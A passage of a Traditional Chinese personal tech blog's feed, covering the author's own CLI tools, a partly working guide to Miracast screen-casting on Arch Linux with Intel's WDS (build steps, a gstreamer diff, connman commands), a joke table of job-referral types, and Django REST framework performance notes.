&lt;li&gt;至於為什麼有辦 Medium 的帳號，主要是有時候想要留言回覆，加上可以使用其他服務登入不用註冊帳號也還算方便，附加功能應該是可以幫別人的文章拍拍手（？）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Social Network Service  &lt;ul&gt;
&lt;li&gt;Facebook, Twitter, Line, Telegram, LinkedIn, Google+ (?)  &lt;/li&gt;
&lt;li&gt;這邊用來紀錄時代的眼淚（？）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Eating My Own Dog Food&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/zdict/zdict"&gt;zdict&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個 CLI 的字典查詢工具，預設支援 Linux, FreeBSD 和 macOS，也可以透過 Docker 在 Windows 上面執行。  &lt;/li&gt;
&lt;li&gt;預設是使用 Yahoo 字典，也有萌典、Urban Dictionary 等等可以查詢。  &lt;/li&gt;
&lt;li&gt;當初是在看美劇的時候常常要查單字，覺得開網頁很麻煩，所以找到了 &lt;code&gt;ydict&lt;/code&gt;，但不盡理想而且開發者也停止維護了，所以就 fork 出來大改，後來身邊也有幾個朋友加入開發，所以就弄了個 organization。  &lt;/li&gt;
&lt;li&gt;現在變成我每天會使用的工具了，之後應該會寫一篇介紹這個工具。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/gettitle"&gt;gettitle&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;寫文章的時候附上參考連結的時候常常不想要只附上網址，而是連網頁標題也一起附上，覺得要自己手動複製很麻煩，所以就寫了個小程式來做這件事。  &lt;/li&gt;
&lt;li&gt;使用 Selenium，所以支援使用 JavaScript 的網頁（例如：Dcard），不過也因為這樣所以速度有點慢，但目前是沒有什麼不能等的狀況，所以算是夠用。  &lt;/li&gt;
&lt;li&gt;基本上已經是我寫文章的時候必定會使用到的工具了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/M157q_News_RSS"&gt;M157q_News_RSS&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個每小時發科技新聞 tweet 的機器人，主要來源是我有追蹤的科技新聞網站的 RSS feed。  &lt;/li&gt;
&lt;li&gt;之前是把科技新聞類的 RSS 放在 Feedly 裏面，但會造成未讀量暴增，常常幾天沒消未讀就會衝到 999+，後來覺得這樣不是辦法，而且很多其實不一定要看。  &lt;/li&gt;
&lt;li&gt;所以就想說能不能用個會發科技新聞的 Twitter bot，有看到的話就看，沒看到的話就算了。  &lt;/li&gt;
&lt;li&gt;是 fork 別人的程式碼來改的：&lt;a href="https://github.com/M157q/py-feedr"&gt;GitHub - M157q/py-feedr: A Python parser to tweet the latest updates from multiple RSS feeds.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;後來自己加上了訂閱事件的功能，當初是針對 Golang Taiwan Gathering 報名要搶票這件事，所以用來針對某些 KKTIX 的網頁新增事件時，會用 Twitter 的私訊通知我，讓我不會錯過報名的時間，甚至可以第一時間報名。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/hungys-blog/my-software-stack-2a406c1c57c1"&gt;My Software Stack – Hungys.blog() – Medium&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Tools"></category><category term="M157q"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>如何在 Linux 上使用 Miracast</title><link href="https://blog.m157q.tw/posts/2018/01/08/miracast-on-linux/" rel="alternate"></link><published>2018-01-15T15:49:47+08:00</published><updated>2018-01-15T15:49:47+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-08:posts/2018/01/08/miracast-on-linux/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;先說結論，試了以下兩個專案：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/albfan/miraclecast"&gt;GitHub - albfan/miraclecast: Connect external monitors to your system via Wifi-Display specification also known as Miracast&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/derekdai/miraclecast"&gt;GitHub - derekdai/miraclecast: Connect external monitors to your system via Wifi-Display specification also known as Miracast&lt;/a&gt; 這個 fork 出去修改的版本解決了比較多的問題，但最後嘗試了一番還是沒辦法順利使用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/intel/wds"&gt;GitHub - intel/wds: Wireless Display Software For Linux OS (WDS)&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;嗯，沒錯，是那個 Intel。  &lt;/li&gt;
&lt;li&gt;這個算是試到後來可以動的，但結果不盡理想，畫面非常卡，聲音也沒有出來，猜測是還得去調整其他 &lt;code&gt;gstreamer&lt;/code&gt; 的參數，這篇會以紀錄 &lt;code&gt;wds&lt;/code&gt; 為主。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;2017 年 5 月換租屋處後，客廳有台螢幕，雖然不大，但至少比筆電的螢幕還大。想說有時候筆電或手機可以把畫面投到上面用大螢幕看比較爽，然後又懶的接有線的 VGA 或 HDMI，就想說來買個無線投影裝置。  &lt;/p&gt;
&lt;p&gt;於是就在 6 月初左右就上網買了便宜的無線投影裝置，該裝置對於 iOS 裝置的支援是使用 &lt;a href="https://en.wikipedia.org/wiki/Digital_Living_Network_Alliance"&gt;DLNA&lt;/a&gt;，對於 Android 裝置的支援則是使用 &lt;a href="https://en.wikipedia.org/wiki/Miracast"&gt;Miracast&lt;/a&gt;，當時是我第一次知道 Miracast。  &lt;/p&gt;
&lt;p&gt;想說筆電是跑 Arch Linux，和 Android 一樣都是 based on Linux，所以應該也可以使用 Miracast 吧？才發現可以用的東西少的可憐，也不一定會動。在 GitHub 上找到了 2 看起來比較有希望的專案，花了好幾個小時，看程式碼、查閱相關文件，終於成功把筆電的畫面透過 Miracast 無線投影到螢幕上。  &lt;/p&gt;
&lt;p&gt;後來因為室友買了個攜帶型投影機送了 Chromecast 之後就沒有使用 Miracast 了，所以這篇算是個半殘文，但還是想紀錄一下，畢竟花了不少時間研究。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;關於 Miracast&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;可以把它想像成用 Wi-Fi 來傳輸 HDMI 訊號，所以可以不用接線就能把畫面投影到其他有支援 Miracast 的裝置上。  &lt;/li&gt;
&lt;li&gt;除了不用接線外，也不需要有其他的裝置或是要連接到某個 Wi-Fi Access Point。  &lt;ul&gt;
&lt;li&gt;這點真的很方便啊，不用買其他裝置就能支援無線投影。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2012 底，由 Wi-Fi Alliance 推出，也是 Android 4.2 的重要新功能之一，但在 2015 年推出的 Android 6.0 卻消失了。  &lt;/li&gt;
&lt;li&gt;Miracast 不知道為啥一直沒有成為標準。  &lt;/li&gt;
&lt;li&gt;Google 後來推出了 Chromecast，基本上這裝置的功能完全和 Miracast 衝突，而且我覺得沒有比較好，除了得額外多接一個 Chromecast 以外，Chromecast 還需要一個額外的 Wi-Fi Access Point，更別說 Chromecast 實際使用上的體驗真的是頗差的。  &lt;/li&gt;
&lt;li&gt;關於 Miracast 詳細介紹，可以參考這篇繁體中文的文章：&lt;a href="http://www.2cm.com.tw/technologyshow_content.asp?sn=1304260008"&gt;以鏡射與Wi-Fi技術為基礎　Miracast實現多螢影音串流 - 技術前瞻 - 新通訊元件雜誌&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;紀錄&lt;/h2&gt;
&lt;p&gt;因為 &lt;a href="https://github.com/derekdai/miraclecast"&gt;MiracleCast&lt;/a&gt; 沒試成功，所以只會以紀錄 &lt;a href="https://github.com/intel/wds"&gt;WDS&lt;/a&gt; 為主。&lt;br /&gt;
其實還有找到一個 &lt;a href="https://cgit.freedesktop.org/~dvdhrm/openwfd/"&gt;openwfd&lt;/a&gt;，不過因為看起來已經年久失修了，所以就沒去試了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;WDS 的裝置分類&lt;/h3&gt;
&lt;p&gt;首先，WDS 把使用 Miracast 的裝置區分為以下兩種：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Sink: 要呈現畫面的裝置。  &lt;/li&gt;
&lt;li&gt;Source: 要把畫面投影出去的裝置。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;我使用 WDS 時遇到的問題&lt;/h3&gt;
&lt;p&gt;然後把當時遇到的問題相關連結都先列出來一下：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://lists.01.org/pipermail/wysiwidi-dev/2015-April/000012.html"&gt;[wysiwidi-dev] desktop_source and mirroring display&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/intel/wds/issues/147"&gt;Working with Linux as Source and Miracast Dongle · Issue #147 · intel/wds · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/intel/wds/issues/87"&gt;source video params should be tweaked for desktop mirroring use case · Issue #87 · intel/wds · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/intel/wds/issues/133"&gt;Black/frozen screen · Issue #133 · intel/wds · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;WDS 安裝與使用步驟&lt;/h3&gt;
&lt;p&gt;WDS 會用到以下幾個程式，必須預先安裝：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;wpa_supplicant&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;2.4 以後的版本，且必須要在 build 的時候開啟 &lt;code&gt;CONFIG_P2P=y&lt;/code&gt;, &lt;code&gt;CONFIG_WIFI_DISPLAY=y&lt;/code&gt;, &lt;code&gt;CONFIG_CTRL_IFACE_DBUS_NEW=y&lt;/code&gt; 這 3 個參數  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;connman&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;必須是 1.28 以後的版本  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;gstreamer&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;接下來就可以照著以下步驟來嘗試：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;git clone https://github.com/intel/wds.git&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;cd wds&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;修改程式碼  &lt;ul&gt;
&lt;li&gt;根據 &lt;a href="https://github.com/intel/wds/issues/87"&gt;source video params should be tweaked for desktop mirroring use case · Issue #87 · intel/wds · GitHub&lt;/a&gt; 和 &lt;a href="https://github.com/intel/wds/issues/133"&gt;Black/frozen screen · Issue #133 · intel/wds · GitHub&lt;/a&gt; 這兩個 issues 裡頭提到的解法，我們得修改程式碼裡頭用到 &lt;code&gt;gstreamer&lt;/code&gt; 的參數，不然只會出現黑的畫面，這部份可能因人而異，我只就我遇到的部份描述，附上 git diff，這個參數還有調整的空間就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gh"&gt;diff --git a/mirac_network/mirac-gst-test-source.cpp b/mirac_network/mirac-gst-test-source.cpp  &lt;/span&gt;
&lt;span class="gh"&gt;index 12c2623..821e38a 100644  &lt;/span&gt;
&lt;span class="gd"&gt;--- a/mirac_network/mirac-gst-test-source.cpp  &lt;/span&gt;
&lt;span class="gi"&gt;+++ b/mirac_network/mirac-gst-test-source.cpp  &lt;/span&gt;
&lt;span class="gu"&gt;@@ -42,7 +42,9 @@ MiracGstTestSource::MiracGstTestSource (wfd_test_stream_t wfd_stream_type, std::  &lt;/span&gt;
     } else if (wfd_stream_type == WFD_TEST_VIDEO) {  
         gst_pipeline = &amp;quot;videotestsrc ! videoconvert ! video/x-raw,format=I420 ! x264enc ! mpegtsmux ! rtpmp2tpay ! udpsink name=sink &amp;quot; + hostname_port;  
     } else if (wfd_stream_type == WFD_DESKTOP) {  
&lt;span class="gd"&gt;-        gst_pipeline = &amp;quot;ximagesrc ! videoconvert ! video/x-raw,format=I420 ! x264enc tune=zerolatency ! mpegtsmux ! rtpmp2tpay ! udpsink name=sink &amp;quot; + hostname_port;  &lt;/span&gt;
&lt;span class="gi"&gt;+        gst_pipeline = &amp;quot;ximagesrc use-damage=0 ! videoscale ! videoconvert ! video/x-raw,format=I420,width=1440,height=900,framerate=50/1 ! x264enc aud=false bitrate=2048 dct8x8=true vbv-buf-capacity=1000 tune=stillimage+zerolatency byte-stream=true ! video/x-h264,profile=high ! muxer. pulsesrc device=alsa_output.pci-0000_00_1b.0.analog-stereo.monitor ! audioconvert ! audio/x-raw,channels=2,rate=44100 ! faac ! audio/mpeg,mpegversion=4 ! muxer. mpegtsmux name=muxer alignment=0 ! rtpmp2tpay pt=33 ! udpsink name=sink sync=false &amp;quot; + hostname_port;  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cmake .&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;make&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo wpa_supplicant -i wlp0s20u1 -ddt -u&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;wlp0s20u1&lt;/code&gt; 請換成你的無線網卡裝置名稱  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;-ddt&lt;/code&gt;: 用來開啟比較詳細的 debug 訊息，且在訊息加上 timestamp  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;-u&lt;/code&gt; : 用來開啟 DBus control interface  &lt;ul&gt;
&lt;li&gt;如果 &lt;code&gt;wpa_supplicant&lt;/code&gt; 在編譯的時候沒有加入上面提到的 &lt;code&gt;CONFIG_CTRL_IFACE_DBUS_NEW=y&lt;/code&gt; 的話，這個選項就不會有用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;執行這行指令的時候最好是先把原本有在用的 network manager 關掉，避免衝突。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo connmand -r -n -d -i wlp0s20u1&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;wlp0s20u1&lt;/code&gt; 請換成你的無線網卡裝置名稱  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;-r&lt;/code&gt;: 不要開啟 DNS proxy  &lt;ul&gt;
&lt;li&gt;官方的 README 上沒有加這個選項，是我自己加上去的，我記得當時可以解掉一些問題，但現在忘了是什麼問題了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-n&lt;/code&gt;: 不要在背景執行，方便看到 debug 訊息  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;-d&lt;/code&gt;: 開啟 debug 模式  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo connmanctl&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;開啟 connman 的互動式介面  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;connmanctl&amp;gt; enable wifi&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;connmanctl&amp;gt; enable p2p&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;connmanctl&amp;gt; scan p2p&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;connmanctl&amp;gt; peers&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;檢查 p2p 功能是否正常  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;connmanctl&amp;gt; agent on&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果以上都正常的話，應該就會像&lt;a href="https://github.com/intel/wds/wiki"&gt;官方在其 GitHub repo 的 wiki 所列出的截圖&lt;/a&gt;一樣：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Android 手機要無線投影到電腦 (Sink mode)  &lt;ul&gt;
&lt;li&gt;打開 Miracast 選單應該就可以看到電腦裝置  &lt;/li&gt;
&lt;li&gt;選擇投影到電腦上  &lt;/li&gt;
&lt;li&gt;許可連線  &lt;/li&gt;
&lt;li&gt;沒問題的話應該就可以在電腦上跳出一個視窗顯示手機的畫面了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;電腦要無線投影到其他裝置 (Source mode)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;connmanctl&amp;gt; scan&lt;/code&gt; 可以重新掃描附近的裝置  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;connmanctl&amp;gt; peers&lt;/code&gt; 列出可以連線的裝置  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;connmanctl&amp;gt; connect N&lt;/code&gt; 連線到該裝置  &lt;/li&gt;
&lt;li&gt;許可連線  &lt;/li&gt;
&lt;li&gt;正常的話其他裝置應該就會顯示電腦上的畫面了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;還沒到完全能動，畫面有點卡，而且沒有聲音，猜測是還得去調整 &lt;code&gt;gstreamer&lt;/code&gt; 的參數。  &lt;/p&gt;
&lt;p&gt;但就紀錄下來，也給可能有遇到這個問題想要解決的人參考，如果有幫助到你的話很歡迎留言跟我說一下，如果試出了更好的結果當然更棒就是。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Digital_Living_Network_Alliance"&gt;Digital Living Network Alliance - Wikipedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Miracast"&gt;Miracast - Wikipedia&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.computerworld.com/article/3239864/android/android-nostalgia-old-features.html"&gt;Android nostalgia: 13 once-trumpeted features that quietly faded away | Computerworld&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.2cm.com.tw/technologyshow_content.asp?sn=1304260008"&gt;以鏡射與Wi-Fi技術為基礎　Miracast實現多螢影音串流 - 技術前瞻 - 新通訊元件雜誌&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Linux"></category><category term="Miracast"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>Referral 的種類</title><link href="https://blog.m157q.tw/posts/2018/01/08/types-of-referral/" rel="alternate"></link><published>2018-01-08T22:53:28+08:00</published><updated>2018-01-08T22:53:28+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-08:posts/2018/01/08/types-of-referral/</id><summary type="html">&lt;p&gt;最近發現 Referral 有以下幾種：  &lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align="left"&gt;種類&lt;/th&gt;
&lt;th&gt;敘述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align="left"&gt;有福同享型&lt;/td&gt;
&lt;td&gt;這間公司超棒，薪水很棒，氣氛也很棒，快來當我同事。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="left"&gt;有難同當型&lt;/td&gt;
&lt;td&gt;我最近 loading 有點高，爭取到開職缺的機會，快來當我同事。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="left"&gt;想當同事型&lt;/td&gt;
&lt;td&gt;覺得你很棒，共事應該不錯，快來當我同事。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="left"&gt;多層介紹型&lt;/td&gt;
&lt;td&gt;我朋友(的朋友)*最近說有職缺，想說你可以試試看，看你有沒有興趣去當同事。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align="left"&gt;抓替死鬼型&lt;/td&gt;
&lt;td&gt;我快要離職了，所以有職缺，快來跟我當同事（？）&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;如果有發現其他種類會再更新上來。  &lt;/p&gt;</summary><category term="Jobs"></category><category term="Interview"></category></entry><entry><title>關於 Django REST framework 的一些筆記</title><link href="https://blog.m157q.tw/posts/2018/01/07/django-rest-framework-note/" rel="alternate"></link><published>2018-01-16T15:04:00+08:00</published><updated>2018-01-16T15:04:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-07:posts/2018/01/07/django-rest-framework-note/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;2016 年 9 月的時候被老闆告知公司報名了交通大學的梅竹黑客松，要我回母校當評審，然後在一個月內生出一個 API 且附帶文件的網站給參賽者使用。  &lt;/p&gt;
&lt;p&gt;當時公司並沒有這些資料的 API，只有資料而已，所以等於是從零開始設計，想說藉由這次機會，除了提供給參賽者 API 以外，未來也可以提供給公司自己使用。  &lt;/p&gt;
&lt;p&gt;在這之前就有聽過 &lt;a href="https://github.com/encode/django-rest-framework"&gt;Django REST frmaework&lt;/a&gt;，也看過滿多人用的，查了一下發現也有 &lt;a href="https://github.com/manosim/django-rest-framework-docs"&gt;DRF Docs (django-rest-framework-docs)&lt;/a&gt; 這個 plugin 可以用來生出 API 的文件，看了一下範例感覺還不錯，於是就放棄用 Flask 自己刻，直接採用 Django + Django REST framework + DRF Docs + Google Cloud SDK + Google App Engine Flexible Environment，建立一個可以從 BigQuery dataset 撈資料出來且帶有文件說明的 API。  &lt;/p&gt;
&lt;p&gt;以下會就當時使用 Django REST framework 和 DRF Docs 遇到的問題做些紀錄，當時為了馬上解決一些問題，也 fork 了 DRF Docs 的 repo 來改。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Django REST framework&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;以下為了撰寫方便，直接把 Django REST framework 簡稱為　DRF。&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;整個 DRF 我覺得設計得滿完整，甚至也有 plugin 的生態系，如果找不到合適的，也可以自己撰寫 DRF 的 plugin。剛開始上手的話有份官方的 Tutorial 可看：&lt;a href="http://www.django-rest-framework.org/tutorial/quickstart/"&gt;Quickstart - Django REST framework&lt;/a&gt;，建議把整份 tutorial 都唸完會比較瞭解整個 framework 元件之間的關係，畢竟篇幅也不多，加上 Quickstart 也就 8 個頁面而已。剩下的等實際撰寫程式碼時遇到不太懂的時候，再去查詢官網上詳細一點的文件就行了，有時候真的文件說的不夠清楚的話可能還是得去看一下程式碼。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;這邊紀錄一下幾個我自己在閱讀文件的時候花比較多時間理解的部份：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.django-rest-framework.org/tutorial/1-serialization/"&gt;1 - Serialization - Django REST framework&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;基本上就是在 Django 的 Model 上再多做一層包裝，可以對 API 做一些客製化設定，比如要顯示哪些欄位、限定哪些權限...等等。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.django-rest-framework.org/api-guide/filtering/"&gt;Filtering - Django REST framework&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;如果要針對不同的使用者得到不同的結果的話，就會需要用到 filtering 的部份。  &lt;/li&gt;
&lt;li&gt;可以針對使用者、網址、可使用參數做限制。  &lt;/li&gt;
&lt;li&gt;有多種不同的 filter 可以用，搜尋、排序、權限，也可以自己繼承下來撰寫客製化的 filter。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.django-rest-framework.org/api-guide/routers/"&gt;Routers - Django REST framework&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;基本上跟 Django 的 dispatcher 寫法差不多，但多了一些可以針對 HTTP method 的設定ˇ等等。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/encode/django-rest-framework/blob/master/rest_framework/viewsets.py"&gt;django-rest-framework/viewsets.py at master · encode/django-rest-framework · GitHub&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;當時是因為對 &lt;code&gt;ViewSet&lt;/code&gt; 可以使用的參數不太清楚，看文件又看不出個所以然，所以就跑去看程式碼了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;p&gt;花了一點時間熟悉之後，我在後續使用上遇到最大的問題是在效能，因為我要去查詢的資料總量滿大的，所以查詢常常都會等很久。還有 DRF 預設的 pagination 部份也沒有處理得很好，查了一下發現也有很多人遇到，所以有滿多文章在講這件事的，這裡列出我自己覺得比較有用的：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://engineering.betterworks.com/2015/09/04/ditching-django-rest-framework-serializers-for-serpy/"&gt;Ditching Django REST Framework Serializers for Serpy · BetterWorks Engineering Blog&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇是作者因為 DRF 的 Serializer 實在是太慢，所以自己寫了另外一個作 serialization 的 library: &lt;a href="https://github.com/clarkduvall/serpy"&gt;serpy&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ses4j.github.io/2015/11/23/optimizing-slow-django-rest-framework-performance/"&gt;Optimizing slow Django REST Framework performance&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇是在講怎麼透過調整 DRF 的 Serializer 來處理 query 時過慢的問題。  &lt;/li&gt;
&lt;li&gt;要用上 &lt;code&gt;queryset.prefech_realted&lt;/code&gt; 等等。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.dabapps.com/blog/api-performance-profiling-django-rest-framework/"&gt;Web API performance: profiling Django REST framework&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇是作者使用了 DRF 並測試其效能以後自己歸納出的一些結論，基本上是推薦使用 DRF，算是我看過最完整對 DRF 做效能測試的文章了。  &lt;/li&gt;
&lt;li&gt;一些迷思：  &lt;ul&gt;
&lt;li&gt;自己寫個框架：即便只有用到 DRF 的 &lt;code&gt;APIView&lt;/code&gt; 其他都沒用到，還是推薦使用 DRF，比起你自己用 Django 撰寫的 API 還是好上許多。  &lt;/li&gt;
&lt;li&gt;想用輕量化的框架：DRF 雖然包含了很多功能，但核心的 view 部份是很簡單的。  &lt;/li&gt;
&lt;li&gt;DRF 會被 Django 的 model 綁住：view 和 serializer 都是可選的，沒有強制綁定。  &lt;/li&gt;
&lt;li&gt;Django/Python/DRF 太慢：這篇文章會大量討論效能的部份，基本上都可以透過適當的資料庫查詢結果暫存、設計良好的 HTTP 暫存以及 shared server-side cache 來解決。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;接下來就是非常詳細的 profiling 步驟與紀錄  &lt;/li&gt;
&lt;li&gt;結論  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Get your ORM lookups right.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Your database lookups will be the bottleneck.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;Work on performance improvements selectively.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;You don't always need to use serializers.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;但這幾篇文章其實都有點舊了，大部份都是 2015 年的，所以可能不一定符合現在的狀況，不確定 DRF 在效能方面改進了多少就是。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;另外，DRF 也有設計一些可以拿來做測試的函式，列在官方的這篇文章裡頭：&lt;a href="http://www.django-rest-framework.org/api-guide/testing/"&gt;Testing - Django REST framework&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;DRF Docs&lt;/h2&gt;
